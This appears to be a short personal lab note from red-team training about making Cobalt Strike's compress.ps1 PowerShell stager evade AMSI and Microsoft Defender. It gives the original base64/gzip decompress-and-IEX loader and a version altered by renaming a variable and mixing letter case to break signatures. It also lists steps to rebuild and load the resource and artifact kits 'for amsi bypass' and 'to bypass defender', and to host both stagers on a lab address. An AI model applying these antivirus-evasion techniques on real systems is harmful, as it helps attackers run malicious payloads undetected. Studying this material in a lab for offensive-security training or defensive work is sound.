*had issues doing this*
Original `compress.ps1` 
```
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```
New `compress.ps1`
```
$DONTSIGME=nEW-Object IO.MemOrYStReAM(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($DONTSIGME,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```
reloading resources.cna in `cobaltstrike` 
locate of `compress.ps1
`

step 1 in reseting cobnalt strike data `Reporting -> Reset Data`
![[Pasted image 20231129134554.png]]
ensure that the resources are rebuilt `ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/resource> ./build.sh /mnt/c/Tools/cobaltstrike/resources`
![[Pasted image 20231129134707.png]]
navigate in `cobaltstrike` to `Cobalt Strike -> Script Manager` and load `C:\Tools\cobaltstrike\resources\resources.cna` for amsi bypass shit & `C:\Tools\cobaltstrike\artifacts\pipe\artifact.cna` for artifacts to bypass defender

`10.10.5.50/a` consists of the unmodified `compress.ps1` file
![[Pasted image 20231129135241.png]]
`10.10.5.50/b` is the modified `compress.ps1` file 
![[Pasted image 20231129135345.png]]
